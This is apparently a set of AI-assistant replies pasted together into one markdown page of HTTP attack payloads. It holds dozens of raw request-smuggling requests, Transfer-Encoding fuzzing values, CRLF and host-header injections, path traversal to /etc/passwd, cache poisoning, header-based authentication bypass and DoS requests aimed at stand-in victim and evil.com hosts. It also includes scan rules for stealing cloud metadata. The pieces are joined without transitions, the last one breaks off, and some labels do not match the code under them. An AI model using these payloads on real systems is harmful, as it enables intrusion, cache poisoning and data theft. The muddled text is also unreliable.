# smuglingdz
smuglingdz


I'll provide you with **50 advanced HTTP request smuggling techniques and scan rules** that go beyond common knowledge. These focus on edge cases, parser differentials, and novel exploitation vectors.

## 🕵️ HTTP Request Smuggling: Advanced Techniques

### **1. CL.TE with Unicode Normalization**
```
Content-Length: 35\r\n
Content-Length: 35\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
```

### **2. TE.CL with Folded Headers**
```
Transfer-Encoding: chunked\r\n
 Content-Length: 4\r\n
\r\n
5c\r\n
GET /admin HTTP/1.1\r\n
Host: internal\r\n
\r\n
0\r\n
\r\n
```

### **3. Space Obfuscation in Headers**
```
Transfer-Encoding : chunked\r\n
Content-Length : 56\r\n
Transfer-Encoding: identity\r\n
```

### **4. Multi-line Header Values**
```
Transfer-Encoding: chunked,\r\n
 chunked\r\n
Content-Length: 0\r\n
```

### **5. Null Byte Injection**
```
Content-Length: 35\r\n
Transfer-Encoding:\0chunked\r\n
```

### **6. CRLF Injection in Header Names**
```
Transfer-Encoding\r\n: chunked\r\n
Content-Length: 56\r\n
```

### **7. Tab Character Variations**
```
Transfer-Encoding:\tchunked\r\n
Content-Length:\t56\r\n
```

### **8. Header Case Sensitivity Exploits**
```
transfer-encoding: chunked\r\n
CONTENT-LENGTH: 56\r\n
```

### **9. Double Chunked Encoding**
```
Transfer-Encoding: chunked\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 56\r\n
```

### **10. Chunked with Invalid Size**
```
Transfer-Encoding: chunked\r\n
\r\n
fffffffffffffffff\r\n
GET /admin HTTP/1.1\r\n
```

### **11. Chunk Extensions Abuse**
```
Transfer-Encoding: chunked\r\n
\r\n
5;extension=value\r\n
GET /a\r\n
0\r\n
\r\n
```

### **12. Trailing Headers After Chunked**
```
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
X-Ignored: header\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **13. Content-Length with Leading Zeros**
```
Content-Length: 00000000000000000056\r\n
Transfer-Encoding: chunked\r\n
```

### **14. Negative Content-Length**
```
Content-Length: -1\r\n
Transfer-Encoding: chunked\r\n
```

### **15. Content-Length with Plus Sign**
```
Content-Length: +56\r\n
Transfer-Encoding: chunked\r\n
```

### **16. Header Continuation with Space**
```
Content-Length: 56\r\n
 Transfer-Encoding: chunked\r\n
```

### **17. Multiple Transfer-Encoding with Different Cases**
```
TrAnSfEr-EnCoDiNg: chunked\r\n
transfer-encoding: identity\r\n
Content-Length: 56\r\n
```

### **18. Chunked with Premature Termination**
```
Transfer-Encoding: chunked\r\n
\r\n
5\r\n
GET /\r\n
```

### **19. CL.TE with Garbage After Length**
```
Content-Length: 56 abc\r\n
Transfer-Encoding: chunked\r\n
```

### **20. TE.TE with Unknown Encodings**
```
Transfer-Encoding: x-chunked, chunked\r\n
Content-Length: 56\r\n
```

### **21. BOM Character Injection**
```
\xEF\xBB\xBFTransfer-Encoding: chunked\r\n
Content-Length: 56\r\n
```

### **22. Non-ASCII Header Names**
```
Tranfer-Encoding😈: chunked\r\n
Content-Length: 56\r\n
```

### **23. Header Value Wrapping**
```
Transfer-Encoding: chunked\r\n
Content-Length: 56\r\n
 \t \r\n
```

### **24. Request Line Smuggling**
```
POST / HTTP/1.1\r\n
Host: a\r\n
Content-Length: 60\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: b\r\n
\r\n
```

### **25. HTTP/2 to HTTP/1.1 Downgrade**
```
:method: POST\r\n
:path: /\r\n
:authority: a.com\r\n
content-length: 5\r\n
transfer-encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin\r\n
```

### **26. Connection Header Manipulation**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive, close\r\n
```

### **27. Expect: 100-continue Race**
```
Content-Length: 100\r\n
Transfer-Encoding: chunked\r\n
Expect: 100-continue\r\n
\r\n
[delay]\r\n
GET /admin\r\n
```

### **28. Host Header Overload**
```
Host: a.com\r\n
Host: b.com\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **29. Cookie Injection Smuggling**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Cookie: session=smuggled\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **30. URL Encoding in Headers**
```
Transfer-Encoding: %63hunked\r\n
Content-Length: 56\r\n
```

### **31. Multi-byte Character Exploits**
```
Transfer-Encoding: chunked\r\n
Content-Length: 5%36\r\n
```

### **32. Backspace Character Injection**
```
Transfer-Encoding: chunked\r\n
Content-Length: 56\x08\r\n
```

### **33. Header Injection via Parameter Pollution**
```
GET /?header=Transfer-Encoding:%20chunked HTTP/1.1\r\n
```

### **34. WebSocket Upgrade Smuggling**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Upgrade: websocket\r\n
Connection: Upgrade\r\n
\r\n
0\r\n
\r\n
GET /ws HTTP/1.1\r\n
```

### **35. Proxy Protocol Injection**
```
PROXY TCP4 1.2.3.4 5.6.7.8 1234 80\r\n
POST /admin HTTP/1.1\r\n
Host: internal\r\n
```

### **36. Cache Poisoning via Smuggling**
```
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /poisoned.html HTTP/1.1\r\n
Host: target.com\r\n
X-Forwarded-Host: attacker.com\r\n
```

### **37. Authentication Bypass via Header Inheritance**
```
POST / HTTP/1.1\r\n
Host: target.com\r\n
Authorization: Bearer smuggled\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **38. Vary Header Manipulation**
```
GET / HTTP/1.1\r\n
Host: target.com\r\n
Vary: X-Smuggled-Header\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
```

### **39. Range Header Smuggling**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Range: bytes=0-100\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **40. Content-Type Boundary Confusion**
```
Content-Type: multipart/form-data; boundary=xxx\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
\r\n
--xxx\r\n
GET /admin HTTP/1.1\r\n
```

### **41. HTTP/0.9 Fallback**
```
GET /\r\n
\r\n
POST /admin HTTP/1.1\r\n
Host: localhost\r\n
```

### **42. Chunked with NULL Chunks**
```
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **43. Header Name with Colon in Value**
```
Transfer-Encoding: chunked\r\n
Content-Length: 56: 57\r\n
```

### **44. Mixed Protocol Smuggling**
```
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 0\r\n
\r\n
\r\n
GET /admin HTTP/2.0\r\n
```

### **45. Via Header Injection**
```
Via: 1.1 smuggled-proxy\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **46. Forwarded Header Abuse**
```
Forwarded: for=1.2.3.4;proto=http\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **47. X-Forwarded-For Chain**
```
X-Forwarded-For: 127.0.0.1\r\n
X-Forwarded-For: internal\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **48. TE with Transfer-Encoding in Body**
```
POST / HTTP/1.1\r\n
Content-Length: 100\r\n
\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **49. Chunked with Extended ASCII**
```
Transfer-Encoding: chunked\r\n
\r\n
5\xC3\xA8\r\n
GET /\r\n
0\r\n
\r\n
```

### **50. Request Smuggling via Web Cache Deception**
```
GET /static/style.css HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
```

## 📋 Advanced Scan Rules

### **Detection Rules**
1. **Time-based differential**: Send two requests and measure response time variance >2s
2. **Connection reuse validation**: Force connection reuse and check for desync
3. **Header normalization fuzzing**: Test all RFC 7230 variations
4. **Response queue analysis**: Monitor for out-of-order responses
5. **Error page differential**: Compare 400/500 responses for parser differences

### **Parser Differential Rules**
6. **Apache vs Nginx vs HAProxy**: Test each combination
7. **CDN bypass**: Check Cloudflare, Akamai, Fastly edge cases
8. **WAF evasion**: Test with WAF-specific header handling
9. **Load balancer inconsistencies**: Round-robin vs sticky sessions
10. **Microservice mesh variations**: Istio, Linkerd, Consul

### **Exploitation Rules**
11. **Internal service discovery**: Smuggle to localhost:8080, 3000, 5000
12. **Cloud metadata theft**: Target 169.254.169.254
13. **Redis/Memcached injection**: Smuggle raw protocol commands
14. **GraphQL introspection bypass**: Target /graphql endpoints
15. **WebSocket hijacking**: Upgrade connection smuggling

### **Fuzzing Parameters**
16. **Header count**: 1-1000 headers
17. **Header size**: 1-65535 bytes
18. **Chunk size variations**: 1-65535 bytes
19. **CRLF positions**: Normal, double, triple, mixed
20. **Null byte positions**: Prefix, infix, suffix

### **Protocol-Specific Rules**
21. **HTTP/2 stream multiplexing**
22. **HTTP/3 QUIC stream isolation**
23. **WebSocket frame boundaries**
24. **gRPC metadata injection**
25. **SOAP/XML boundary confusion**

## 🔧 Automated Detection Tools

```python
# Custom Nuclei template example
id: advanced-http-smuggling
info:
  name: TE.CL with Unicode Normalization
  severity: high

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 35
        Transfer-Encoding: chunked
        Transfer-Encoding: chunked
        
        0
        
        GET /admin HTTP/1.1
        Host: localhost
```

```bash
# Custom Burp Suite extension logic
def scan_http_smuggling(base_request):
    techniques = [
        cl_te_unicode,
        te_cl_folded_headers,
        space_obfuscation,
        null_byte_injection,
        multi_line_headers
    ]
    
    for technique in techniques:
        smuggled = technique(base_request)
        response1 = send_request(smuggled, reuse_conn=True)
        response2 = send_request(base_request, reuse_conn=True)
        
        if response1 != response2:
            report_vulnerability(technique, smuggled)
```

## 🛡️ Mitigation Rules

1. **Normalize all headers** before processing
2. **Reject ambiguous requests** with both CL and TE
3. **Use HTTP/2 end-to-end** where possible
4. **Implement request validation** at edge
5. **Disable connection reuse** for untrusted clients
6. **Use strict header parsing** (drop on any deviation)
7. **Limit header count and size**
8. **Log all parser errors** for monitoring

## 📚 References

- RFC 7230 Section 3.3.3: Message Body Length
- CVE-2019-20372: Apache HTTP Server request smuggling
- PortSwigger Research: HTTP Desync Attacks
- BlackHat 2021: HTTP/2 Request Smuggling

These techniques represent advanced, often undocumented vectors for HTTP request smuggling. Always ensure you have proper authorization before testing, as these can cause service disruption if not handled carefully.

I understand now — you're asking for **payloads** (test cases, attack vectors, or fuzzing inputs) related to the `Transfer-Encoding` header. This is commonly used in **security testing**, **HTTP smuggling**, **request smuggling**, and **fuzzing** scenarios.

Here's a comprehensive list of `Transfer-Encoding` payloads:

---

## 1. Basic Encoding Variations

### Standard valid
```
Transfer-Encoding: chunked
Transfer-Encoding: gzip
Transfer-Encoding: deflate
Transfer-Encoding: compress
Transfer-Encoding: gzip, chunked
Transfer-Encoding: deflate, chunked
Transfer-Encoding: gzip, deflate, chunked
```

### Case variations
```
transfer-encoding: chunked
TRANSFER-ENCODING: chunked
TrAnSfEr-EnCoDiNg: chunked
```

### Whitespace variations
```
Transfer-Encoding: chunked
Transfer-Encoding:  chunked
Transfer-Encoding: chunked  
Transfer-Encoding:    chunked
Transfer-Encoding: chunked\t
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\r\n
```

---

## 2. Chunked Encoding Payloads (for HTTP Smuggling)

### Standard chunked format
```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

5
hello
0

```

### CL.TE (Content-Length + Transfer-Encoding) smuggling
```
POST / HTTP/1.1
Host: example.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

```

### TE.CL smuggling
```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12
GET /admin HTTP/1.1
Host: localhost
0

```

### Obfuscated Transfer-Encoding header
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked, chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: chunked; charset=utf-8
Transfer-Encoding: chunked; boundary=something
Transfer-Encoding: chunked, x-gzip
Transfer-Encoding: CHUNKED
Transfer-Encoding: chunkEd
```

---

## 3. Malformed / Fuzzing Payloads

### Invalid encoding names
```
Transfer-Encoding: chunked2
Transfer-Encoding: chunk
Transfer-Encoding: chunked, invalid
Transfer-Encoding: foobar
Transfer-Encoding: null
Transfer-Encoding: 123
Transfer-Encoding: chunked;foo=bar
Transfer-Encoding: chunked,,gzip
Transfer-Encoding: chunked, ,gzip
Transfer-Encoding: ,chunked
Transfer-Encoding: chunked, 
Transfer-Encoding: (chunked)
Transfer-Encoding: "chunked"
Transfer-Encoding: 'chunked'
```

### Multiple headers (duplicate)
```
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```
```
Transfer-Encoding: gzip
Transfer-Encoding: chunked
```

### Combined with Content-Length variations
```
Content-Length: 0
Transfer-Encoding: chunked
```
```
Content-Length: 100
Transfer-Encoding: chunked
```
```
Content-Length: 
Transfer-Encoding: chunked
```
```
Content-Length: -1
Transfer-Encoding: chunked
```

---

## 4. Chunk Extension Payloads

### Chunk extensions (RFC 7230)
```
Transfer-Encoding: chunked

5;foo=bar
hello
0;trailer=value

```
```
5;foo="bar"
hello
0;done=true

```
```
5;ignore
hello
0

```

### Chunk size variations
```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
0

```
(Zero-length chunk mid-stream)

```
ffffffffffffffff
...
```
(Extremely large chunk size)

```
-1
...
```
(Negative chunk size)

```
0x5
...
```
(Hex with prefix)

```
5
...
```
(Valid)

```
05
...
```
(Leading zero)

```
5 
...
```
(Space after size)

---

## 5. Header Injection / CRLF Payloads

```
Transfer-Encoding: chunked\r\nX-Injected: true
```
```
Transfer-Encoding: chunked\r\n\r\nGET /evil HTTP/1.1\r\nHost: evil.com
```
```
Transfer-Encoding: chunked\nX-Evil: true
```

---

## 6. TE Header (Client Request) Payloads

The client `TE` header negotiates accepted transfer encodings:

```
TE: chunked
TE: gzip
TE: deflate
TE: chunked, gzip, deflate
TE: trailers
TE: chunked;q=0.8, gzip;q=0.5
TE: 
TE: *
TE: chunked, identity
TE: compress
```

---

## 7. Combined Attack Vectors

### HTTP/2 to HTTP/1 smuggling
```
:method: POST
:path: /
:scheme: https
transfer-encoding: chunked
content-length: 100

0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n
```

### Chunked + Connection header
```
Transfer-Encoding: chunked
Connection: keep-alive, Transfer-Encoding
```

### Chunked with trailer headers
```
Transfer-Encoding: chunked

5
hello
0
X-Malicious: true

```

---

## 8. Null Byte / Unicode Payloads

```
Transfer-Encoding: chunked%00
Transfer-Encoding: chunked\x00
Transfer-Encoding: chunked%0d%0a
Transfer-Encoding: chunked﻿
Transfer-Encoding: chunked⁠
```

---

## Summary Table by Category

| Category | Purpose |
|----------|---------|
| Valid encodings | Baseline functionality |
| Case/whitespace | Bypass weak filters |
| CL/TE smuggling | Request smuggling attacks |
| TE/CL smuggling | Request smuggling attacks |
| Obfuscated names | WAF/filter bypass |
| Chunk extensions | Chunk parsing edge cases |
| Chunk size fuzzing | Integer overflow/parsing bugs |
| Duplicate headers | Header normalization bypass |
| CRLF injection | Header injection attacks |
| TE negotiation | Client-side fuzzing |
| Null/Unicode | Parser differential attacks |

---

If you're looking for specific **automated tools** to generate these (like `httpx`, `ffuf`, ` smuggler.py`, or Burp Intruder payloads), or want **targeted payloads** for a specific scenario (WAF bypass, HTTP smuggling, fuzzing), let me know and I'll tailor them.

Here's a comprehensive list of **HTTP/1.1 attacks**, organized by category with payloads and explanations:

---

## 1. HTTP Request Smuggling

### CL.TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

```

### TE.CL (Transfer-Encoding vs Content-Length)
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 4
Transfer-Encoding: chunked

12
GET /admin HTTP/1.1
Host: localhost
0

```

### TE.TE (Obfuscated Transfer-Encoding)
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 46
Transfer-Encoding: chunked
Transfer-encoding: x

0

GET /admin HTTP/1.1
Host: localhost

```

### Chunked with spaces
```
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 51

0

GET /admin HTTP/1.1
Host: localhost

0

```

### Double Content-Length
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 0
Content-Length: 50

GET /admin HTTP/1.1
Host: localhost
```

### Content-Length with negative value
```
POST / HTTP/1.1
Host: victim.com
Content-Length: -5

GET /admin HTTP/1.1
Host: localhost
```

---

## 2. HTTP Header Injection / CRLF Injection

### Set-Cookie injection
```
GET /redirect?url=%0d%0aSet-Cookie:%20sessionid=evil HTTP/1.1
Host: victim.com
```

### Redirect location injection
```
GET /search?q=test%0d%0aLocation:%20http://evil.com HTTP/1.1
Host: victim.com
```

### Response splitting
```
GET /login?redirect=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2020%0d%0a%0d%0a<html>Hacked!</html> HTTP/1.1
Host: victim.com
```

### Custom header injection
```
POST /submit HTTP/1.1
Host: victim.com
X-Forwarded-For: 127.0.0.1%0d%0aX-Admin: true
```

---

## 3. Host Header Attacks

### Host header injection
```
GET / HTTP/1.1
Host: evil.com
```
```
GET / HTTP/1.1
Host: victim.com:443@evil.com
```
```
GET / HTTP/1.1
Host: victim.com:80@evil.com:80
```

### Duplicate Host headers
```
GET / HTTP/1.1
Host: victim.com
Host: evil.com
```

### Host header with port manipulation
```
GET / HTTP/1.1
Host: victim.com:8080@evil.com
```
```
GET / HTTP/1.1
Host: victim.com:443@evil.com:443
```

### Absolute URI with different Host
```
GET http://evil.com/ HTTP/1.1
Host: victim.com
```

### Line wrapping
```
GET / HTTP/1.1
Host: victim.com
 Host: evil.com
```

### Null byte injection
```
GET / HTTP/1.1
Host: victim.com%00.evil.com
```

---

## 4. HTTP Method Tampering

### Verb tampering
```
GET /admin HTTP/1.1
Host: victim.com
```
```
POST /admin HTTP/1.1
Host: victim.com
```
```
PUT /admin HTTP/1.1
Host: victim.com
```
```
DELETE /admin/user/1 HTTP/1.1
Host: victim.com
```
```
PATCH /admin HTTP/1.1
Host: victim.com
```
```
HEAD /admin HTTP/1.1
Host: victim.com
```
```
OPTIONS /admin HTTP/1.1
Host: victim.com
```
```
TRACE / HTTP/1.1
Host: victim.com
```
```
CONNECT /admin HTTP/1.1
Host: victim.com
```

### Method override headers
```
POST / HTTP/1.1
Host: victim.com
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET
X-Original-Method: GET
```

### Custom methods
```
FOOBAR /admin HTTP/1.1
Host: victim.com
```
```
INDEX /admin HTTP/1.1
Host: victim.com
```

---

## 5. Path Traversal / Directory Traversal

### Basic traversal
```
GET /../../../etc/passwd HTTP/1.1
Host: victim.com
```
```
GET /..;/..;/etc/passwd HTTP/1.1
Host: victim.com
```
```
GET /....//....//etc/passwd HTTP/1.1
Host: victim.com
```

### Encoded traversal
```
GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: victim.com
```
```
GET /..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: victim.com
```
```
GET /..%c0%af..%c0%af..%c0%af/etc/passwd HTTP/1.1
Host: victim.com
```

### Unicode traversal
```
GET /..%u2215..%u2215..%u2215etc/passwd HTTP/1.1
Host: victim.com
```

---

## 6. HTTP Request Splitting / Pipeline Attacks

### Request splitting
```
GET / HTTP/1.1\r\nHost: victim.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: victim.com\r\n
```

### Pipeline injection
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 0

GET /admin HTTP/1.1
Host: victim.com
```

### Null prefix
```
GET \x00/admin HTTP/1.1
Host: victim.com
```

---

## 7. Cache Poisoning

### Unkeyed header injection
```
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
```
```
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Path: /evil
```
```
GET / HTTP/1.1
Host: victim.com
X-Original-URL: /admin
```
```
GET / HTTP/1.1
Host: victim.com
X-Rewrite-URL: /admin
```

### Cache key collision
```
GET / HTTP/1.1
Host: victim.com
User-Agent: \x00
```
```
GET / HTTP/1.1
Host: victim.com
Cookie: session=admin
 Cookie: session=admin
```

### Vary header abuse
```
GET / HTTP/1.1
Host: victim.com
Accept-Encoding: gzip, deflate, \x00
```

---

## 8. Authentication Bypass

### Basic auth injection
```
GET /protected HTTP/1.1
Host: victim.com
Authorization: Basic YWRtaW46YWRtaW4=
```
```
GET /protected HTTP/1.1
Host: victim.com
Authorization: Basic admin:admin
```

### Header-based auth bypass
```
GET /admin HTTP/1.1
Host: victim.com
X-Original-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### Cookie manipulation
```
GET /admin HTTP/1.1
Host: victim.com
Cookie: admin=1
Cookie: admin=true
Cookie: admin=admin
Cookie: role=admin
Cookie: isAdmin=true
```

---

## 9. Denial of Service

### Slowloris (incomplete headers)
```
GET / HTTP/1.1
Host: victim.com
X-Custom: [slowly sending data...]
```

### Large header
```
GET / HTTP/1.1
Host: victim.com
X-Large: [10,000+ characters]
```

### Multiple headers
```
GET / HTTP/1.1
Host: victim.com
X-1: a
X-2: a
... [1000+ headers]
```

### Chunked bomb
```
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked

ffffffff
[very large chunk]
0
```

### Range header DoS
```
GET /largefile HTTP/1.1
Host: victim.com
Range: bytes=0-0, 1-1, 2-2, ... [thousands of ranges]
```

---

## 10. Web Cache Deception

### Path confusion
```
GET /admin/../profile HTTP/1.1
Host: victim.com
```
```
GET /admin;/profile HTTP/1.1
Host: victim.com
```
```
GET /admin%2fprofile HTTP/1.1
Host: victim.com
```
```
GET /admin%252fprofile HTTP/1.1
Host: victim.com
```

---

## 11. HTTP Desync Attacks

### Header folding
```
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
 Content-Length: 50

0

GET /admin HTTP/1.1
Host: localhost
```

### Tab separator
```
POST\t/ HTTP/1.1\r\n
Host: victim.com\r\n
```

### Space after method
```
GET  /admin HTTP/1.1
Host: victim.com
```

---

## 12. Response Header Injection

### Content-Type confusion
```
GET /file.jpg HTTP/1.1
Host: victim.com
Accept: text/html
```
```
GET /upload.php HTTP/1.1
Host: victim.com
Content-Type: image/jpeg
[actual PHP code]
```

### CORS misconfiguration
```
GET /api/data HTTP/1.1
Host: victim.com
Origin: https://evil.com
Access-Control-Request-Method: GET
```

---

## 13. HTTP Redirect Abuse

### Open redirect via headers
```
GET /redirect?url=//evil.com HTTP/1.1
Host: victim.com
```
```
GET /redirect?url=https://evil.com HTTP/1.1
Host: victim.com
```
```
GET /redirect?url=////evil.com HTTP/1.1
Host: victim.com
```

### CRLF redirect
```
GET /redirect?url=%0d%0aLocation:%20http://evil.com HTTP/1.1
Host: victim.com
```

---

## 14. HTTP Parameter Pollution

### Duplicate parameters
```
POST /login HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

user=admin&user=guest&pass=admin
```

### Array parameters
```
POST /search HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

user[]=admin&user[]=guest
```

### JSON pollution
```
POST /api HTTP/1.1
Host: victim.com
Content-Type: application/json

{"user":"admin","user":"guest","pass":"admin"}
```

---

## 15. WebSocket Hijacking

### Upgrade header injection
```
GET / HTTP/1.1
Host: victim.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Version: 13
```

---

## Attack Summary Table

| Category | Attack Type | Impact |
|----------|-------------|--------|
| Request Smuggling | CL/TE, TE/CL, TE/TE | Request hijacking, session theft |
| Header Injection | CRLF, Response Splitting | Cache poisoning, XSS |
| Host Header | Injection, Duplicate | Vhost takeover, cache poisoning |
| Method Tampering | Verb tampering, Override | Auth bypass, access control bypass |
| Path Traversal | Directory traversal | File read, LFI |
| Cache Poisoning | Unkeyed headers, Key collision | Malicious cache serving |
| DoS | Slowloris, Large headers | Service disruption |
| Desync | Header folding, Chunked | Request smuggling, session hijacking |

---

If you need **specific payloads** for any of these attack categories, **exploitation techniques**, or **mitigation strategies**, let me know!

Here's a comprehensive guide to **HTTP Version Manipulation** attacks, techniques, and payloads:

---

## 1. HTTP Version Fuzzing

### Invalid version strings
```
GET / HTTP/0.9
Host: victim.com
```
```
GET / HTTP/1.0
Host: victim.com
```
```
GET / HTTP/1.1
Host: victim.com
```
```
GET / HTTP/1.2
Host: victim.com
```
```
GET / HTTP/1.5
Host: victim.com
```
```
GET / HTTP/2.0
Host: victim.com
```
```
GET / HTTP/3.0
Host: victim.com
```

### Malformed version formats
```
GET / HTTP/1.1\r\n
Host: victim.com
```
```
GET / HTTP/1.1\x00
Host: victim.com
```
```
GET / HTTP/1.1\x0a
Host: victim.com
```
```
GET / HTTP/1.1\x0d
Host: victim.com
```
```
GET / HTTP/1.1\x20
Host: victim.com
```
```
GET / HTTP/1.1\t
Host: victim.com
```
```
GET / HTTP/1.1 
Host: victim.com
```

### Missing version
```
GET / \r\n
Host: victim.com
```
```
GET /\r\n
Host: victim.com
```
```
GET / HTTP/\r\n
Host: victim.com
```

### Extended versions
```
GET / HTTP/1.1.1
Host: victim.com
```
```
GET / HTTP/1.1.0
Host: victim.com
```
```
GET / HTTP/1.1.0.0
Host: victim.com
```
```
GET / HTTP/1.1a
Host: victim.com
```
```
GET / HTTP/1.1beta
Host: victim.com
```
```
GET / HTTP/1.1-dev
Host: victim.com
```

---

## 2. HTTP/0.9 Exploitation

### HTTP/0.9 response smuggling
```
GET /admin\r\n
```
(No headers, no Host, raw response)

### CRLF injection in HTTP/0.9
```
GET /%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20victim.com%0d%0a\r\n
```

### HTTP/0.9 to HTTP/1.1 upgrade confusion
```
GET / HTTP/0.9
Host: victim.com

GET /admin HTTP/1.1
Host: victim.com
```

---

## 3. HTTP/1.0 vs HTTP/1.1 Behavior Differences

### Connection header behavior
```
GET / HTTP/1.0
Host: victim.com
```
(Connection closes by default)

```
GET / HTTP/1.0
Host: victim.com
Connection: keep-alive
```
(Forces keep-alive in HTTP/1.0)

```
GET / HTTP/1.1
Host: victim.com
```
(Keep-alive by default)

```
GET / HTTP/1.1
Host: victim.com
Connection: close
```
(Forces close)

### Host header requirement
```
GET / HTTP/1.0
```
(No Host header allowed in HTTP/1.0)

```
GET / HTTP/1.1
```
(Missing Host header - should return 400)

### Chunked encoding availability
```
GET / HTTP/1.0
Transfer-Encoding: chunked
```
(Not supported in HTTP/1.0)

```
GET / HTTP/1.1
Transfer-Encoding: chunked
```
(Supported in HTTP/1.1)

---

## 4. HTTP Version Downgrade Attacks

### Forcing HTTP/1.0 to bypass security
```
GET /admin HTTP/1.0
Host: victim.com
X-Forwarded-For: 127.0.0.1
```
(Some WAFs only inspect HTTP/1.1)

### HTTP/2 to HTTP/1 downgrade smuggling
```
:method: POST
:path: /
:scheme: https
transfer-encoding: chunked
content-length: 100

0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n
```

### ALPN negotiation manipulation
```
ClientHello
ALPN Extension: http/1.0
```
(Force downgrade during TLS negotiation)

---

## 5. HTTP/2 Specific Manipulation

### HTTP/2 to HTTP/1.1 smuggling
```
POST / HTTP/2
Host: victim.com
content-length: 0

GET /admin HTTP/1.1
Host: localhost
```

### HTTP/2 header injection
```
:method: GET
:path: /admin
:authority: victim.com
x-injected: \r\nLocation: http://evil.com
```

### HTTP/2 request smuggling via padding
```
POST / HTTP/2
Content-Length: 5
Padding: [1000 bytes]

0\r\n\r\nGET /admin
```

---

## 6. HTTP/3 (QUIC) Manipulation

### QUIC version downgrade
```
Initial Packet
Version: 0xff00001d (Google QUIC)
```
(Force downgrade to gQUIC)

### HTTP/3 to HTTP/1.1 translation attacks
```
:method: POST
:path: /admin
:scheme: https
transfer-encoding: chunked
content-length: 100
```
(Proxy translation confusion)

---

## 7. Version Negotiation Attacks

### Multiple version lines
```
GET / HTTP/1.1
GET / HTTP/1.0
Host: victim.com
```

### Version in different positions
```
HTTP/1.1 200 OK
GET / HTTP/1.1
Host: victim.com
```

### Upgrade header manipulation
```
GET / HTTP/1.1
Host: victim.com
Upgrade: h2c
Connection: Upgrade
```
(HTTP/1.1 to HTTP/2 upgrade)

```
GET / HTTP/1.1
Host: victim.com
Upgrade: websocket, h2c
Connection: Upgrade
```
(Multiple upgrade tokens)

---

## 8. Proxy/Gateway Version Confusion

### Frontend HTTP/1.1, Backend HTTP/1.0
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 100
Transfer-Encoding: chunked

[chunked data]
```
(Backend may not support chunked)

### Header normalization differences
```
GET / HTTP/1.1
Host: victim.com
X-Custom: value1
 x-custom: value2
```
(Header folding - HTTP/1.1 allows, some backends reject)

---

